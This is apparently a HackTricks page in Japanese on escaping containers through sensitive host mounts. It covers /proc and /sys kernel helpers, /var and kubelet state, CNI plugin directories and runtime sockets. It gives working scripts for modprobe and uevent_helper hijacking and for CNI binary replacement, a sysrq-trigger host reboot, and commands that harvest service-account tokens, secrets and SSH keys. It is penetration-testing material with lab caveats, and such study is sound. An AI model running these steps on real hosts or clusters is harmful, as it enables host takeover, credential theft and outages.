# Sensitive Host Mounts

{{#include ../../../banners/hacktricks-training.md}}

## 概要

Host mount は、注意深く隔離されたプロセスのビューをホストリソースへの直接的な可視性に戻してしまうことが多いため、実践的な container escape の攻撃面として特に重要です。危険なケースは `/` に限りません。`/proc`、`/sys`、`/var`、runtime socket、kubelet が管理する状態、デバイス関連のパスを bind mount すると、kernel control、credentials、隣接する container の filesystem、runtime 管理インターフェースが露出する可能性があります。

このページを個々の保護ページとは別に設けているのは、悪用のモデルが複数の領域にまたがるためです。writable な host mount が危険なのは、mount namespace、user namespace、AppArmor や SELinux の適用範囲、そして公開された正確な host path がそれぞれ関係するためです。独立したトピックとして扱うことで、攻撃面をはるかに把握しやすくなります。

また、host 上の writable なディレクトリと、各 container 内の対応するパスを比較してください。実行可能な起動スクリプトが置かれたディレクトリにマウントされている場合、権限の低い host user が、次回の再起動時に権限の高い container の entrypoint が読み込むコードを仕込める可能性があります。正確な bind source と destination、ディレクトリの write/search 権限、entrypoint のループと実行可能ファイルの要件、runtime UID、実際に再起動を引き起こす条件を確認してください。Container UID 0 が自動的に host UID 0 になるわけではありません。host への影響は user-namespace mapping と mount policy によって決まります。受動的な調査では、スクリプトを書いたり workload を再起動したりせず、パスと権限を報告してください。

Linux container は、一部の Windows host filesystem を別途共有する管理 VM 内で稼働している場合があります。[VirtualBox shared folders](https://docs.oracle.com/en/virtualization/virtualbox/7.1/user/guestadditions.html) は、host のファイルを guest から見えるようにする方法の一つですが、その VM の root は依然として Windows administrator とは別の identity です。共有によってユーザーの SSH private key を読み取れる場合は、credential の手がかりとして扱ってください。host を backing とする正確な mount、key の所有者とアクセス権、対応する account、そして Windows SSH server の**実効的な** authorized-key policy を確認してから、host への login が可能と判断してください。最新の [Windows OpenSSH](https://learn.microsoft.com/en-us/windows-server/administration/openssh/openssh_keymanagement) では、administrator account に対して通常、別個の `administrators_authorized_keys` ファイルが使われます。通常の列挙結果に private key の内容を含めないでください。受動的なトリアージには、mount と key path のメタデータで十分です。

## `/proc` の露出

procfs には、通常のプロセス情報だけでなく、影響の大きい kernel control interface も含まれています。そのため、`-v /proc:/host/proc` のような bind mount や、想定外の writable な proc entry を公開する container view は、情報漏えい、サービス拒否、ホスト上での直接的なコード実行につながる可能性があります。

procfs の重要度の高いパスには、以下があります。

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc/`（特に `register` と `status`）
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### 悪用

まず、重要度の高い procfs entry のうち、どれが見えているか、または書き込み可能かを確認します。

```bash
for p in \
  /proc/sys/kernel/core_pattern \
  /proc/sys/kernel/modprobe \
  /proc/sys/fs/binfmt_misc/status \
  /proc/sys/fs/binfmt_misc/register \
  /proc/sysrq-trigger \
  /proc/kmsg \
  /proc/kallsyms \
  /proc/kcore \
  /proc/sched_debug \
  /proc/1/mountinfo \
  /proc/config.gz; do
  [ -e "$p" ] && ls -l "$p"
done
```

これらのパスが注目される理由はそれぞれ異なります。`core_pattern`、`modprobe`、`binfmt_misc` は、書き込み可能な場合にホストでのコード実行経路になり得ます。`kallsyms`、`kmsg`、`kcore`、`config.gz` は、kernel exploitation に役立つ強力な偵察情報源です。`sched_debug` と `mountinfo` からはプロセス、cgroup、ファイルシステムのコンテキストが分かり、コンテナ内からホストの構成を再構築する手掛かりになります。

各パスの実用上の価値は異なります。すべて同じ影響があるかのように扱うと、トリアージが難しくなります。

- `/proc/sys/kernel/core_pattern`
  書き込み可能な場合、kernel がクラッシュ後にパイプハンドラーを実行するため、procfs のパスの中でも特に影響が大きいものの1つです。コンテナから `core_pattern` を、overlay 内またはマウントされたホストパス上の payload に設定できれば、多くの場合、ホストでコードを実行できます。専用の例については [read-only-paths.md](protections/read-only-paths.md) も参照してください。
- `/proc/sys/kernel/modprobe`
  このパスは、kernel がモジュール読み込み処理を呼び出す必要があるときに使う userspace helper を制御します。コンテナから書き込み可能で、ホストのコンテキストで解釈される場合、これもホストでのコード実行プリミティブになり得ます。helper の呼び出し経路を発動させる手段と組み合わせると、特に注目すべきです。
- `/proc/sys/vm/panic_on_oom`
  通常、これは明確な escape プリミティブではありませんが、OOM 状態を kernel panic に変えることで、メモリ不足をホスト全体の denial of service に発展させる可能性があります。
- `/proc/sys/fs/binfmt_misc`
  登録インターフェースが書き込み可能な場合、攻撃者は任意の magic value に対するハンドラーを登録し、一致するファイルが実行された際にホストのコンテキストでコードを実行できる可能性があります。
- `/proc/config.gz`
  kernel exploit のトリアージに役立ちます。ホストのパッケージ情報がなくても、どの subsystem、mitigation、任意の kernel 機能が有効かを確認できます。
- `/proc/sysrq-trigger`
  主に denial of service に使われる経路ですが、非常に深刻な影響があります。ホストを直ちに再起動、panic、またはその他の方法で停止させる可能性があります。
- `/proc/kmsg`
  kernel ring buffer のメッセージを明らかにします。ホストの fingerprinting、クラッシュ解析に役立ち、環境によっては kernel exploitation に有用な情報の leak にもつながります。
- `/proc/kallsyms`
  読み取り可能な場合は有用です。公開された kernel symbol 情報が得られ、kernel exploit の開発時にアドレスランダム化の前提を崩す助けになることがあります。
- `/proc/[pid]/mem`
  これはプロセスメモリへの直接インターフェースです。必要な ptrace 相当の条件を満たして対象プロセスにアクセスできれば、別のプロセスのメモリを読み取ったり変更したりできる可能性があります。現実的な影響は credentials、`hidepid`、Yama、ptrace の制限に大きく左右されるため、強力ではありますが条件付きの経路です。
- `/proc/kcore`
  システムメモリを core image のように見せるインターフェースです。ファイルは非常に大きく扱いにくいものの、実質的に読み取り可能なら、ホストのメモリ領域が危険な形で公開されていることを示します。
- `/dev/kmem` と `/dev/mem`
  これらは歴史的に影響の大きい、生メモリへの **デバイス** インターフェースであり、procfs ファイルではありません。現代の多くのシステムでは存在しないか、厳しく制限されていますが、ホストからマウントされたコピーをコンテナが開ける場合は、重大な露出として扱ってください。存在しない `/proc/kmem` や `/proc/mem` のパスを探すのではなく、他の機密性の高い `/dev` マウントとあわせて確認してください。
- `/proc/sched_debug`
  スケジューリングとタスクの情報が leak し、他のプロセス表示が予想以上に整理されている場合でも、ホストのプロセス ID が露出する可能性があります。
- `/proc/[pid]/mountinfo`
  コンテナがホスト上のどこに実際に存在するか、どのパスが overlay によるものか、書き込み可能なマウントがホストのコンテンツに対応するのか、コンテナのレイヤーだけに対応するのかを再構築するうえで、非常に役立ちます。

`/proc/[pid]/mountinfo` や overlay の詳細を読み取れる場合は、それらを使ってコンテナのファイルシステムに対応するホストパスを特定してください:

```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```

これらのコマンドは、ホスト実行の手法の多くで、コンテナ内のパスをホスト側から見た対応するパスに変換する必要があるため便利です。

### 例: `modprobe` ヘルパーのパスを準備する

コンテナから `/proc/sys/kernel/modprobe` に書き込み可能で、ヘルパーのパスがホストのコンテキストで解釈される場合、攻撃者が制御するペイロードにリダイレクトできます。overlay の上位ディレクトリはホスト側から解決できる必要があります。また、コンテナがホストの `/tmp` もマウントしていない場合、証明用の出力はホストから見える同じコンテナレイヤーに書き込む必要があります。

```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
[ -n "$host_path" ] || exit 1
original_modprobe=$(cat /proc/sys/kernel/modprobe)
cat > /tmp/modprobe-payload <<EOF
#!/bin/sh
id > "$host_path/tmp/modprobe.out"
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
# Run only an authorized, lab-specific helper trigger here.
cat /tmp/modprobe.out
printf '%s\n' "$original_modprobe" > /proc/sys/kernel/modprobe
```

正確なトリガーはターゲットとカーネルの挙動によって異なるため、意図的に推測していません。ラボを離れる前に元の値に戻してください。重要なのは、書き込み可能なヘルパーパスによって、将来のカーネルヘルパー呼び出しを攻撃者が制御するホストパス上のコンテンツへリダイレクトできることです。overlay の `upperdir` が存在しない、ホストがパスを解決できない、sysctl マウントが読み取り専用である、またはカーネルが選択したヘルパーを一度も呼び出さない場合、この一連の流れは成立しません。

### 完全な例: `kallsyms`、`kmsg`、`config.gz` を使った Kernel Recon

すぐに escape するのではなく、exploitability を評価することが目的なら:

```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```

これらのコマンドを使うと、有用なシンボル情報が見えるか、最近のカーネルメッセージから興味深い状態が分かるか、また、どのカーネル機能や緩和策が組み込まれているかを確認できます。通常、直接の脱出につながるものではありませんが、カーネルの脆弱性のトリアージを大幅に短縮できることがあります。

### 完全な例：SysRqによるホストの再起動

`/proc/sysrq-trigger` が書き込み可能で、ホスト側のビューに届く場合：

```bash
echo b > /proc/sysrq-trigger
```

影響は即座にホストの再起動として現れます。これは微妙な例ではありませんが、procfs の露出が情報漏えいよりはるかに深刻な事態を招き得ることを明確に示しています。

## `/sys` の露出

sysfs は、カーネルやデバイスの状態を大量に公開します。sysfs のパスの中には主にフィンガープリントに役立つものもあれば、ヘルパーの実行、デバイスの挙動、セキュリティモジュールの設定、ファームウェアの状態に影響を及ぼすものもあります。

価値の高い sysfs のパスには、次のものがあります。

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

これらのパスが重要な理由はそれぞれ異なります。`/sys/class/thermal` は熱管理の挙動に影響し、露出の仕方によってはホストの安定性を損なう可能性があります。`/sys/kernel/vmcoreinfo` はクラッシュダンプやカーネルレイアウトに関する情報を leak し、低レベルのホストフィンガープリントに役立つ場合があります。`/sys/kernel/security` は Linux Security Modules が使用する `securityfs` インターフェースであり、想定外のアクセスによって MAC 関連の状態が露出または変更される可能性があります。EFI 変数のパスはファームウェアに保存されたブート設定に影響するため、通常の設定ファイルよりはるかに深刻なものです。`/sys/kernel/debug` 配下の `debugfs` は特に危険です。開発者向けインターフェースとして意図的に設計されており、本番環境向けに強化されたカーネル API と比べて安全性への配慮が大幅に少ないためです。

このリストにある sysfs エントリはすべて、**カーネル、設定、ハードウェアに依存します**。現在の仮想化ノードでは、`uevent_helper`、EFI 変数、thermal デバイスのエントリがまったく存在しないことがよくあります。あるパスが存在しない場合は、別のカーネルの例が当てはまると決めつけず、必要な前提条件が満たされていないこととして記録してください。

これらのパスを確認する際に役立つコマンドは次のとおりです。

```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```

これらのコマンドが注目に値する理由:

- `/sys/kernel/security` から、AppArmor、SELinux、または別の LSM の surface が、本来ホスト内にとどまるべき形で見えていないか確認できます。
- `/sys/kernel/debug` は、このグループで最も懸念されることが多い項目です。`debugfs` がマウントされ、読み取りまたは書き込み可能な場合、カーネルに広くアクセスできる surface が存在すると考えられます。具体的なリスクは有効になっている debug ノードによって異なります。
- EFI 変数が露出しているケースはまれですが、通常のランタイムファイルではなくファームウェアに保存された設定に関わるため、影響は大きくなります。
- `/sys/class/thermal` は、シェル経由の分かりやすい escape よりも、主にホストの安定性やハードウェアとのやり取りに関係します。
- `/sys/kernel/vmcoreinfo` は主にホストのフィンガープリンティングやクラッシュ解析に利用でき、カーネルの低レベルな状態を把握するのに役立ちます。

### 完全な例: `uevent_helper`

`/sys/kernel/uevent_helper` はカーネルや設定に依存し、現在のシステムでは存在しないこともよくあります。これが存在して書き込み可能であり、利用可能な `uevent` トリガーがある場合、カーネルが攻撃者の制御するヘルパーを実行する可能性があります。証明用の出力には、ホストとコンテナの両方から見えるパスを使用する必要があります:

```bash
[ -w /sys/kernel/uevent_helper ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
[ -n "$host_path" ] || exit 1
original_helper=$(cat /sys/kernel/uevent_helper)
cat > /evil-helper <<EOF
#!/bin/sh
id > "$host_path/output"
EOF
chmod +x /evil-helper
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
# This virtual-device path is a common lab trigger, but is not present everywhere.
uevent_file=/sys/class/mem/null/uevent
if [ ! -w "$uevent_file" ]; then
  printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
  echo "No writable, pre-approved uevent trigger was found" >&2
  exit 1
fi
echo change > "$uevent_file"
cat /output
printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
```

この方法が機能するのは、helper path がホスト側の視点で解釈されるためです。トリガーされると、helper は現在のコンテナ内ではなく、ホストのコンテキストで実行されます。`/sys/class/mem/null/uevent` は、このファイルが公開されているカーネルで使える具体的なトリガーの1つです。ほかのデバイスが独自の `uevent` ファイルを公開している場合もありますが、実機で無作為に選択しないでください。ラボを終了する前に、元の値に戻してください。helper ファイルまたは制御可能なトリガーが存在しない場合、この手法が利用可能だと報告しないでください。

## `/var` の公開

ホストの `/var` をコンテナにマウントすることは、`/` のマウントほど劇的に見えないため、過小評価されがちです。しかし実際には、ランタイムソケット、コンテナの snapshot ディレクトリ、kubelet が管理する Pod ボリューム、投影された service-account token、隣接するアプリケーションのファイルシステムにアクセスできる可能性があります。最近のノードでは、運用上重要なコンテナの状態が実際に `/var` に置かれていることがよくあります。

### Kubernetes の例

`hostPath: /var` を指定した Pod は、多くの場合、ほかの Pod の投影された token や overlay の snapshot 内容を読み取れます。

```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```

これらのコマンドは、mount に公開されているのが単なるアプリケーションデータなのか、重大な影響を及ぼす cluster credentials なのかを判断するのに役立ちます。読み取り可能な service-account token があれば、local code execution から Kubernetes API access に直ちに発展する可能性があります。

token が見つかった場合は、発見しただけで終わらせず、何にアクセスできるかを検証してください。

```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```

ここでの影響は、ローカルノードへのアクセスをはるかに超える可能性があります。広範な RBAC 権限を持つトークンがあれば、マウントされた `/var` を通じてクラスター全体を侵害できます。

### Docker と containerd の例

Docker ホストでは、該当するデータは多くの場合 `/var/lib/docker` の下にあります。一方、containerd ベースの Kubernetes ノードでは、`/var/lib/containerd` または snapshotter 固有のパスの下にある場合があります。

```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```

マウントされた `/var` から別のワークロードのスナップショット内容に書き込み可能な場合、攻撃者は現在のコンテナ設定に触れることなく、アプリケーションファイルの改変、Webコンテンツの配置、起動スクリプトの変更を行える可能性があります。

**使い捨てのラボ用ワークロード**では、書き込み可能なスナップショット内容を使って、アプリケーションの改ざん、シークレットの復元、ラテラルムーブメントを実証できます。まずランタイムのコンテナIDを正確なスナップショットに対応付け、無関係なスナップショットや本番用スナップショットは決して編集しないでください：

```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f \( -path '*/.ssh/*' -o -path '*/authorized_keys' \) 2>/dev/null | head -n 20
```

これらのコマンドは、マウントされた `/var` がもたらす主な影響を3つのカテゴリ、つまりアプリケーションの改ざん、secretの回収、隣接するワークロードへの横展開として示しているため有用です。

snapshotへの直接書き込みは、runtimeの通常の状態管理を迂回し、コンテナを破損させたり証拠を破壊したりする可能性があります。読み取り専用の調査は、Dockerの`overlay2`に対してローカルで再現しました。隣接する使い捨てコンテナに書き込んだマーカーが、`/var/lib/docker/overlay2/<id>/diff/`以下に現れました。実際のsnapshotの変更は、そのテスト用に作成した使い捨てコンテナに限定してください。

## Kubeletの状態、Plugins、CNIのパス

`/var/lib/kubelet`、`/opt/cni/bin`、または`/etc/cni/net.d`のマウントは、privileged DaemonSet、CNIエージェント、CSI node plugin、GPU operator、ストレージヘルパーを通じて公開されていることがよくあります。こうしたマウントは「ノードの配線」として軽視されがちですが、新しいpodの実行経路に直接位置しており、kubeletの認証情報、projected secret、登録用socket、ホスト側で実行されるpluginバイナリが含まれていることもよくあります。

価値の高いターゲットには、次のものがあります。

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

確認に便利なコマンドは次のとおりです。

```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
  egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```

これらのパスが重要な理由:

- `/var/lib/kubelet/pki` には、kubelet クライアント証明書やその他のノードローカルの認証情報が含まれている可能性があります。クラスターの設計によっては、API server または kubelet が接続する TLS エンドポイントへのアクセスに再利用できる場合があります。<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/pods` には、同じノード上の隣接する Pod 向けに投影された service-account token やマウント済みの Secret が含まれていることがよくあります。
- `/var/lib/kubelet/pod-resources/kubelet.sock` は主に偵察の対象ですが、非常に有用です。どの Pod やコンテナが GPU、hugepages、SR-IOV デバイスなど、ノードローカルの希少なリソースを現在使用しているかが分かります。<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/device-plugins`、`/var/lib/kubelet/plugins`、`/var/lib/kubelet/plugins_registry` からは、インストールされている CSI、DRA、device plugin と、kubelet が通信する想定の socket が分かります。これらのディレクトリが読み取り専用ではなく書き込み可能な場合、問題はさらに深刻になります。<sup>[[1]](#references)</sup>
- `/opt/cni/bin` と `/etc/cni/net.d` は、Pod ネットワークのセットアップ処理に直接関わります。ここへの書き込み可能なアクセスは、単なる設定情報の露出ではなく、遅れて host execution を引き起こす手段となることがよくあります。<sup>[[2]](#references)</sup>

### 完全な例: 書き込み可能な `/opt/cni/bin`

ホストの CNI binary ディレクトリが読み書き可能な状態でマウントされている場合、plugin を置き換えるだけで、そのノード上で kubelet が次に Pod sandbox を作成するときに host execution を得られる可能性があります。<sup>[[2]](#references)</sup>

```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
  grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > "$(dirname "$0")/.cni-triggered"
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
cat "$(dirname "$plugin")/.cni-triggered"
mv "${plugin}.orig" "$plugin"
rm -f "$(dirname "$plugin")/.cni-triggered"
```

これはマウントされた `docker.sock` ほど即座に使えるものではありませんが、侵害された Kubernetes インフラストラクチャ Pod では、こちらのほうが現実的な場合がよくあります。マーカーはマウントされたプラグインの隣に書き込まれるため、host-root や host-`/tmp` のマウントがなくても、コンテナから取得できます。wrapper は元の引数と標準入力をそのまま渡し、その後、例では元のバイナリを復元します。重要なのは、変更されたバイナリが現在のコンテナではなく、後にホストのネットワーク設定フローによって実行される点です。無効な wrapper によって新しい Pod サンドボックスにネットワークが割り当てられなくなる可能性があるため、使い捨てのノードでのみ実行してください。

## Runtime Sockets

ホストの機密マウントには、ディレクトリ全体ではなくランタイムソケットが含まれていることがよくあります。これらは非常に重要なので、ここで改めて明示しておきます。

```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```

これらのソケットのいずれかがマウントされた後の完全なexploitフローについては、[runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md)を参照してください。

まずは、簡単な対話パターンとして次のようにします。

```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```

これらのいずれかが成功した場合、「mounted socket」から「より高い権限を持つ sibling container の起動」までの道のりは、通常、kernel breakout を試みるよりもはるかに短くなります。

同じ daemon access を使って、**host persistence** を確立することもできます。書き込み可能な host-root bind mount を持つ helper container に `docker cp` でファイルを送り、その後 `docker exec` で、マウントされた host path 配下に SSH key、service unit、その他の persistence file を配置できます。セキュリティ境界となるのは host mount を作成する daemon の権限であり、`docker cp` は単なるステージング手順です。runtime socket が公開された後に、新たに作成された container と、host の認証関連パスや起動パスへの書き込みの両方を監査してください。

## Writable Host Path Task Hijack

書き込み可能な host mount は、危険になるために `/` を公開する必要はありません。マウントされたパスに、host 側の scheduled task や service が後で読み込む script、config file、hook、plugin、その他のファイルが含まれている場合、container から host が実行する内容を書き換えられる可能性があります。

一般的な確認手順:

```bash
mount | grep -E ' /host|/mnt|/shared|/opt|/var '
find /host /mnt /shared -maxdepth 4 -type f -writable 2>/dev/null | head -n 50
grep -RniE 'cron|systemd|ExecStart|sh |bash |python|backup|hook|plugin' /host /mnt /shared 2>/dev/null | head -n 50
```

書き込み可能なファイルがホストプロセスに読み込まれる場合、テスト中はpayloadをシンプルにし、動作を確認できるようにします。

```bash
printf '#!/bin/sh\nid >/tmp/host-task-check\n' > /host/path/to/hook.sh
chmod +x /host/path/to/hook.sh
```

興味深いのは信頼境界です。書き込みはコンテナ内から行われますが、実行は後でホストサービスのコンテキストで行われます。これにより、限定的な hostPath または bind mount が、遅延型のホストコード実行プリミティブになります。

## 共有ホストパス上のroot所有ファイル

rootになれるコンテナアカウントは、ホストも使用する書き込み可能なパスに、root所有のファイルを配置できる場合があります。コンテナのUID 0がホストのUID 0にマッピングされ、両方のビューが同じファイルを参照し、ホストのマウントがSUID実行を許可している場合、そのパス上のroot所有SUID実行ファイルを実行できるホストユーザーは、ホストの権限境界を越えられる可能性があります。このファイル所有権の問題が生じるために、コンテナを`--privileged`で実行する必要はありません。別途必要となる条件については、[user namespace mappings](protections/namespaces/user-namespace.md)と[SUIDの説明](privileged-containers.md)を参照してください。

パスを**両側から**確認してください。無害なファイルの所有者と識別情報を比較し、コンテナの`uid_map`と`gid_map`を確認し、ホストのマウントオプションと実行ポリシーを調べます。コンテナ側が`rw`で`nosuid`なしというだけでは、候補にすぎません。それだけではホスト側の所有権、ホストのマウントフラグ、ホストユーザーのアクセス権、またはAppArmor/SELinuxが実行を阻止するかどうかは判断できません。`noexec`は、適用されるビューでの実行を制限します。`/proc/self/mountinfo`の`shared:`および`master:`タグはマウント伝播を示すものであり、ファイルの内容がホストと共有されているかどうかを示すものではありません。bind mountにこれらのタグがない場合もあります。ホストログインを可能にする認証情報の再利用は、共有ファイルによる権限境界とは別の段階です。

ホストのランタイムストレージも、明示的なbind mountがなくても同様のパスを作り出すことがあります。[CVE-2021-41091](https://github.com/moby/moby/security/advisories/GHSA-3fwx-pjgw-3558)では、権限のないホストユーザーがDockerデータのサブディレクトリをたどり、コンテナのファイルシステム内のファイルを実行できました。Mobyは20.10.9で権限を修正し、ディレクトリを正しい状態にするには実行中のコンテナを再起動する必要があるとしています。マウントされた正確な`overlay2/<id>/merged`パスと、各親ディレクトリの検索権限を確認したうえで、コンテナのUID 0がホストのUID 0にマッピングされているか、実際のroot所有SetUID実行ファイルが存在し到達可能か、ホスト側のビューでSetUID実行が許可されているかを確認してください。rootlessまたはuser-namespace-remappedコンテナ、`nosuid`、`noexec`、`no_new_privs`、MACポリシーによって結果が変わることがあります。ランタイムのバージョンや到達可能なパスだけでは、ホストrootで実行できる証拠にはならず、調査の手がかりにすぎません。候補の実行ファイルを実行せずに、マウントとファイルのメタデータを調べてください。

## マウント関連のCVE

ホストマウントはランタイムの脆弱性とも関係します。最近の重要な例を以下に示します。

- `runc`の`CVE-2024-21626`では、漏洩したディレクトリファイルディスクリプターにより、作業ディレクトリがホストファイルシステム上に置かれる可能性がありました。
- BuildKitの`CVE-2024-23651`、`CVE-2024-23652`、`CVE-2024-23653`では、悪意あるDockerfile、フロントエンド、および`RUN --mount`の処理によって、ビルド中にホストファイルへのアクセス、削除、または権限昇格が再び可能になる可能性がありました。
- BuildahおよびPodmanのビルド処理における`CVE-2024-1753`では、ビルド中に細工されたbind mountによって`/`が読み書き可能な状態で公開される可能性がありました。
- `containerd` 2.1.0の`CVE-2025-47290`では、イメージの展開中に発生するTOCTOUにより、細工されたイメージがpull中にホストファイルシステムを変更できる可能性がありました。

これらのCVEが重要なのは、マウント処理がオペレーターの設定だけの問題ではないことを示しているためです。ランタイム自体が、マウントを起点とするエスケープ条件を引き起こすこともあります。

## 確認方法

影響の大きいマウントの露出をすばやく見つけるには、次のコマンドを使います。

```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 -type s \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```

ここで注目すべき点:

- ホストのルートディレクトリ、`/proc`、`/sys`、`/var`、ランタイムソケットは、いずれも優先度の高い発見事項です。
- 書き込み可能な proc/sys エントリは、多くの場合、そのマウントが安全なコンテナビューではなく、ホスト全体に影響するカーネル制御を公開していることを意味します。
- マウントされた `/var` のパスは、ファイルシステムの調査だけでなく、認証情報や隣接するワークロードも確認する必要があります。
- Kubelet の状態ディレクトリや CNI/plugin のパスも、ランタイムソケットと同等の優先度で確認する必要があります。これらは多くの場合、ノード上での Pod 作成や認証情報の配布経路に直結しているためです。

## ローカルでの検証状況

このページに記載した実用的な攻撃チェーンは、ローカルの Linux minikube ノードで検証しました。検証では、以下を再現しました。

- 一時的に作成した書き込み可能な hostPath を介した読み取りと書き込み
- `/var/lib/kubelet/pods` を介した、投影された ServiceAccount token とマウント済み Secret の発見
- マウントされた kubelet 状態から取得した有効な token を使った、Kubernetes API への認証成功
- マウントされた `/var` を介した、隣接する Docker `overlay2` ファイルシステムの読み取り専用での発見
- マウントされた `docker.sock` を介した Docker API による、読み取り専用のホスト bind を持つ sibling コンテナの作成
- ホスト側で消費される一時的な hook を介した、遅延ホスト実行
- 元の plugin の引数、標準入力、実行を維持する CNI-wrapper のシミュレーション

同じノードでは `core_pattern`、`modprobe`、`binfmt_misc/register`、`kallsyms`、`kcore`、`config.gz` が公開されていましたが、`uevent_helper`、EFI 変数、thermal エントリ、`sched_debug` は公開されていませんでした。破壊的なカーネルトリガーは実行していません。この結果、ホスト root、`/var`、kubelet-state、ソケット、ホスト側 consumer を利用する攻撃チェーンは再現可能である一方、procfs/sysfs helper の手法は、正確なカーネル、マウントモード、payload のパス、トリガーに応じて条件付きで扱う必要があることが確認できました。

## References

- [1] [Kubelet が使用するローカルファイルとパス](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [2] [cilium-agent コンテナが `hostPath` マウントを介してホストにアクセスできる](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
{{#include ../../../banners/hacktricks-training.md}}
